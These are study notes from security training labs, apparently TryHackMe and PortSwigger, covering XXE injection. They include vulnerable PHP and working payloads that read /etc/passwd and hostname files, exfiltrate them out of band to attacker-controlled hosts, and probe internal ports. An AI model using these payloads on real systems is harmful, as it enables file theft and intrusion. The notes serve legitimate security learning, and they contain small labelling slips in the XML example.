

# THM 

## Definitions
### XML
XML (Extensible Markup Language) is typically used by applications to store and transport data in a format that's both human-readable and machine-parseable.

XML elements are represented by tags, which are surrounded by angle brackets (<>). Tags usually come in pairs, with the opening tag preceding the content and the closing tag following the content. For example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
   <name>Pop</name>
   <age>30</age>
   <address>
      <street>2508 Schulle Ave</street>
      <city>Austin</city>
   </address>
</user>
```
- name = an **element**
- Bill = **content**
- id = **attribute**
- 1 = **value**
- Character data refers to the content within the elements (John, 30, etc)
### XSLT
XSLT (Extensible Stylesheet Language Transformations) is a language used to transform and format XML documents. It can be used to facilitate XML External Entity (**XXE**) attacks in the following ways: 
- **Data Extraction**: XSLT can be used to extract sensitive data from an XML document, which can then be used in an XXE attack. For example, an XSLT stylesheet can extract user credentials or other sensitive information from an XML file.
- **Entity Expansion**: XSLT can expand entities defined in an XML document, including external entities. This can allow an attacker to inject malicious entities, leading to an XXE vulnerability.
- **Data Manipulation**: XSLT can manipulate data in an XML document, potentially allowing an attacker to inject malicious data or modify existing data to exploit an XXE vulnerability.
- **Blind XXE**: XSLT can be used to perform blind XXE attacks, in which an attacker injects malicious entities without seeing the server's response.

### DTDs
DTDs or **Document Type Definitions** define the structure and constraints of an XML document. They specify the allowed elements, attributes, and relationships between them. DTDs can be internal within the XML document or external in a separate file. They can be used for:
- **Validation**: DTDs validate the structure of XML to ensure it meets specific criteria before processing, which is crucial in environments where data integrity is key.
- **Entity Declaration**: DTDs define entities that can be used throughout the XML document, including external entities which are key in XXE attacks.  

Internal DTDs are specified using the `<!DOCTYPE` declaration, while external DTDs are referenced using the SYSTEM keyword.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
<!ELEMENT config (database)>
<!ELEMENT database (username, password)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
]>
<config>
<!-- configuration data -->
</config>
```

The example above shows an internal DTD defining the structure of a configuration file. The `<!ELEMENT` declarations specify the allowed elements and their relationships.

### XML Entities
XML entities are basically variables for data or code that can be expanded within an XML document. `<!ENTITY external SYSTEM "http://site.com"` can be called later with `&external`. There are five types of entities: 
1. Internal entities - defined within a document
	1. `<!ENTITY inf "This string here">` can be called later in the document as `&inf`
2. External entities - defined outside the document 
	1. `<!ENTITY external SYSTEM "http://site.com"` can be called later with `&external`.
3. Parameter entities - define reusable structures or to include external DTD subsets
	1. `<!ENTITY % common "CDATA:>`
	   `<!ELEMENT name (%common;)>`
	   Means that the name element should contain CDATA which is basically just strings. 
4. General entities - similar to variables and can be declared either internally or externally, but they can intended for use in the document content. 
5. Character entities - represent special or reserved characters that cannot be used directly in XML documents to prevent the parser from misunderstanding. Ex:
	1. `&lt;` for the less-than symbol (`<`)
	2. `&gt;` for the greater-than symbol (`>`)
	3. `&amp;` for the ampersand (`&`)

### XML Parsing
XML parsing is the process by which an XML file is read, and its information is accessed and manipulated by a software program.
- **DOM (Document Object Model) Parser**: This method builds the entire XML document into a memory-based tree structure, allowing random access to all parts of the document. It is resource-intensive but very flexible.
- **SAX (Simple API for XML) Parser**: Parses XML data sequentially without loading the whole document into memory, making it suitable for large XML files. However, it is less flexible for accessing XML data randomly.
- **StAX (Streaming API for XML) Parser**: Similar to SAX, StAX parses XML documents in a streaming fashion but gives the programmer more control over the XML parsing process.
- **XPath Parser**: Parses an XML document based on expression and is used extensively in conjunction with XSLT.


## In-Band XXE
This code returns the name you submit in the form (name parameter)
```php
libxml_disable_entity_loader(false);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $xmlData = file_get_contents('php://input');

    $doc = new DOMDocument();
    $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); 

    $expandedContent = $doc->getElementsByTagName('name')[0]->textContent;

    echo "Thank you, " .$expandedContent . "! Your message has been received.";
}
```

We can use it for our own purposes to create a new variable then submit as the name
![](/assets/images/XXE%20Injection/Screenshot%202024-11-25%20at%2011.56.32%20PM.png)

Then substitute into the request:

```
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

Where the name is now `&xxe` which we've defined as `/etc/passwd`

This can also be used for DDoS by defining an entity as a long string and then calling it a bunch. 
## Out-Of-Band XXE
This XML doesn't return a parameter in the browser:
```php
libxml_disable_entity_loader(false);
$xmlData = file_get_contents('php://input'); 

$doc = new DOMDocument();
$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);

$links = $doc->getElementsByTagName('file');

foreach ($links as $link) {
    $fileLink = $link->nodeValue;
    $stmt = $conn->prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())");
    $stmt->bind_param("s", $fileLink);
    $stmt->execute();
    
    if ($stmt->affected_rows > 0) {
        echo "Link saved successfully.";
    } else {
        echo "Error saving link.";
    }
    
    $stmt->close();
}
```

1. In a case like this, we can include this in the request:
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://kaliIP:1337/" >]>
<upload><file>&xxe;</file></upload>
```

2. If we get a request on our kali machine, we can create a DTD, and then serve it. Here is a sample DTD (`sample.dtd`) which we can include inside our serving folder:
```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://kaliIP:1337/?data=%cmd;'>">
%oobxxe;
```
- This base64 encodes the `/etc/passwd` file and we can see the base64 data when the request is made. 

*Most XXE vulnerabilities arise from malicious DTDs.*

## SSRF + XXE
**Server-Side Request Forgery (SSRF)** attacks occur when an attacker abuses functionality on a server, causing the server to make requests to an unintended location. In the context of XXE, an attacker can manipulate XML input to make the server issue requests to internal services or access internal files.

We can include this in our Burp request to find internal servers, provided we fuzz the ports:
```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```
# Burp Labs
### Lab: Blind XXE with out-of-band interaction
Simple XXE, examples from previous, as well as example [here](https://www.imperva.com/learn/application-security/xxe-xml-external-entity/)

```XML
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE external [
	<!ELEMENT external ANY>
	<!ENTITY xxe SYSTEM
	"http://el3ysffkojqyrjyht4sp9mhbl2rtfm3b.oastify.com">
	]>

	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
		1
		</storeId>
	</stockCheck>
```
- *Note that examples show an indent, but when I tried to get it to* **indent** *in Burp, it would not cooperate, and it didn't matter.*

### Lab: Blind XXE with out-of-band interaction via XML parameter entities
Parameter entities are declared with `%`
```XML
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE root [
	<!ENTITY % ext SYSTEM "http://t5zdcuzz8yadbyiwdjc4t11q5hb8z3ns.oastify.com/x"> %ext;
]>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```
- probably should have subbed out the productId for the `%ext;`, but it still worked

#### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
- Needed to use DNS for this which I had not done. I should have known that from the **blind** in the title of the lab. 

Here is the DTD file to store on the exploit server:
```XML
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

- **It's important to note the Burp Collaborator payload here** - You ultimately get the hostname from the HTTP request in Collaborator
Here is the XML payload in the request:
```XML
<?xml version="1.0" ?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a1200e30456148181b302e3015d009e.exploit-server.net/xxe.dtd"> %xxe;]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			%xxe;
		</storeId>
	</stockCheck>
```


### Lab: Exploiting blind XXE to retrieve data via error messages
Pretty basic, can grab it from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#exploiting-error-based-xxe)
Payload: 
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "https://exploit-0a0100cf038a1be680095c0a01a600ec.exploit-server.net/exploit.dtd">
    %ext;
]>
<stockCheck>
	<productId>
		20
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```
 And the .dtd 
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### Lab: Exploiting XInclude to retrieve files

![](/assets/images/XXE/xinclude.png)

Also from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#exploiting-error-based-xxe)
- The XInclude statement is inside the productId

### Lab: Exploiting XXE via image file upload

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

- The SVG format uses XML, so we should take note if the upload mechanism **accepts SVG** files
- Create an `file.svg` with the content shown above
- Upload the file
- View the file 
































